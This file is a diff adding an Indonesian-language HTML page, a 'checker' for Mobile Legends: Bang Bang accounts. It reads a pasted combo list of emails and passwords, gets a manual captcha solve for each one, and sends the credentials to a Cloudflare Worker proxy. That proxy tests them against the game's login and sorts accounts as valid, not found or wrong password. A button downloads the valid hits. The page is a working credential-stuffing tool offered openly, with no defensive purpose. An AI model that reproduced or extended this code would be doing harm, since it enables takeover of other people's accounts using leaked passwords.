@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>MLBB Checker Manual Captcha</title>
+  <script src="https://cstaticdun.126.net/load.min.js"></script>  
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 900px; margin: auto; padding: 20px; }
+    textarea { width: 100%; height: 180px; font-family: monospace; }
+    #captcha-root { margin: 12px 0; }
+    #log { background: #111; color: #eee; height: 300px; overflow-y: auto; padding: 10px; font-family: monospace; white-space: pre-wrap; }
+    button { padding: 10px 16px; cursor: pointer; margin-right: 8px; }
+    .ok { color: #7CFC00; }
+    .bad { color: #FF6B6B; }
+    .info { color: #FFD866; }
+  </style>
+</head>
+<body>
+
+  <h2>MLBB Checker Manual Captcha</h2>
+  <p>Paste list akun (email|password per baris). Untuk tiap akun akan muncul CAPTCHA manual. Hasil langsung muncul di log.</p>
+
+  <textarea id="combo" placeholder="user1@example.com|Pass123\nuser2@example.com:Pass456"></textarea>
+  <br/>
+  <button id="startBtn">Start Checking</button>
+  <button id="stopBtn" disabled>Stop</button>
+  <button id="downloadSessionBtn">Download Valid Sementara (Worker A)</button>
+  <div id="status" style="margin-top:10px;"></div>
+
+  <div id="captcha-root"></div>
+
+  <h3>Log:</h3>
+  <div id="log"></div>
+
+  <script>
+    const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af";  // Ganti dengan captchaId kamu
+    const WORKER_A_URL = "https://worker-a.domainkamu.workers.dev/check";
+    const WORKER_A_DOWNLOAD_SESSION_URL = "https://worker-a.domainkamu.workers.dev/session-valid";
+
+    let combos = [];
+    let currentIndex = 0;
+    let stopRequested = false;
+    let neCaptchaInstance = null;
+
+    const logEl = document.getElementById("log");
+    const statusEl = document.getElementById("status");
+    const startBtn = document.getElementById("startBtn");
+    const stopBtn = document.getElementById("stopBtn");
+    const downloadSessionBtn = document.getElementById("downloadSessionBtn");
+
+    function appendLog(text, cls) {
+      const time = new Date().toLocaleTimeString();
+      const div = document.createElement("div");
+      div.textContent = `[${time}] ${text}`;
+      if(cls) div.className = cls;
+      logEl.appendChild(div);
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    function parseCombos(text) {
+      return text.split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(line => {
+        if(line.includes("|")) {
+          const [e,p] = line.split("|",2);
+          return { email: e.trim(), password: p.trim() };
+        } else if(line.includes(":")) {
+          const [e,p] = line.split(":",2);
+          return { email: e.trim(), password: p.trim() };
+        } else {
+          appendLog(`Format salah dan dilewati: ${line}`, "info");
+          return null;
+        }
+      }).filter(Boolean);
+    }
+
+    function showCaptchaOnce() {
+      return new Promise((resolve, reject) => {
+        const root = document.getElementById("captcha-root");
+        root.innerHTML = "";
+        if(!window.initNECaptcha) {
+          appendLog("initNECaptcha tidak tersedia", "info");
+          reject("initNECaptcha missing");
+          return;
+        }
+
+        if(neCaptchaInstance && typeof neCaptchaInstance.destroy === "function") {
+          neCaptchaInstance.destroy();
+          neCaptchaInstance = null;
+        }
+
+        try {
+          initNECaptcha({
+            captchaId: CAPTCHA_ID,
+            element: "#captcha-root",
+            mode: "embed",
+            width: "320px",
+            onReady() {},
+            onVerify(err, data) {
+              if(err) {
+                appendLog("Error saat verify captcha: " + JSON.stringify(err), "info");
+                reject(err);
+                return;
+              }
+              if(!data || !data.validate) {
+                appendLog("Token captcha kosong", "info");
+                reject("no token");
+                return;
+              }
+              const token = data.validate;
+              if(neCaptchaInstance && typeof neCaptchaInstance.destroy === "function") {
+                neCaptchaInstance.destroy();
+                neCaptchaInstance = null;
+              }
+              resolve(token);
+            },
+            onLoad(instance) {
+              neCaptchaInstance = instance;
+            }
+          });
+        } catch(e) {
+          appendLog("Gagal inisialisasi captcha: " + e, "info");
+          reject(e);
+        }
+      });
+    }
+
+    async function checkOneAccount(account) {
+      appendLog(`Minta captcha untuk ${account.email}`, "info");
+      statusEl.textContent = `Checking ${currentIndex + 1}/${combos.length}: ${account.email}`;
+      try {
+        const token = await showCaptchaOnce();
+        appendLog(`Token captcha diterima`, "info");
+
+        const payload = {
+          email: account.email,
+          password: account.password,
+          e_captcha: token
+        };
+
+        const resp = await fetch(WORKER_A_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+
+        if (!resp.ok) {
+          appendLog(`HTTP error ${resp.status} untuk ${account.email}`, "bad");
+          return;
+        }
+
+        const data = await resp.json();
+
+        if (data.code === 0) {
+          appendLog(`VALID => ${account.email}`, "ok");
+        } else if (data.code === 1004) {
+          appendLog(`NOT FOUND => ${account.email}`, "bad");
+        } else if (data.code === 1005) {
+          appendLog(`WRONG PASSWORD => ${account.email}`, "bad");
+        } else {
+          appendLog(`LAINNYA => ${account.email} | ${JSON.stringify(data)}`, "info");
+        }
+
+      } catch (err) {
+        appendLog(`Error cek ${account.email}: ${err}`, "bad");
+      }
+    }
+
+    function updateTextareaCombos() {
+      combos = combos.filter((_, i) => i >= currentIndex);
+      document.getElementById("combo").value = combos.map(c => `${c.email}|${c.password}`).join("\n");
+    }
+
+    async function startChecking() {
+      combos = parseCombos(document.getElementById("combo").value);
+      if (combos.length === 0) {
+        appendLog("Tidak ada akun untuk dicek", "info");
+        return;
+      }
+
+      startBtn.disabled = true;
+      stopBtn.disabled = false;
+      stopRequested = false;
+      currentIndex = 0;
+      logEl.innerHTML = "";
+
+      while (currentIndex < combos.length && !stopRequested) {
+        const account = combos[currentIndex];
+        await checkOneAccount(account);
+        currentIndex++;
+        updateTextareaCombos();
+      }
+
+      appendLog("Proses selesai", "info");
+      statusEl.textContent = "Selesai";
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+    }
+
+    startBtn.addEventListener("click", startChecking);
+    stopBtn.addEventListener("click", () => {
+      stopRequested = true;
+      stopBtn.disabled = true;
+      appendLog("Proses dihentikan user", "info");
+    });
+
+    downloadSessionBtn.addEventListener("click", async () => {
+      try {
+        const resp = await fetch(WORKER_A_DOWNLOAD_SESSION_URL);
+        if (!resp.ok) {
+          appendLog(`Gagal download valid sementara: HTTP ${resp.status}`, "bad");
+          return;
+        }
+        const text = await resp.text();
+        const blob = new Blob([text], { type: "text/plain" });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "valid-sementara.txt";
+        a.click();
+        URL.revokeObjectURL(url);
+        appendLog("File valid sementara berhasil diunduh", "info");
+      } catch (err) {
+        appendLog("Error saat download valid sementara: " + err, "bad");
+      }
+    });
+  </script>
+</body>
+</html>
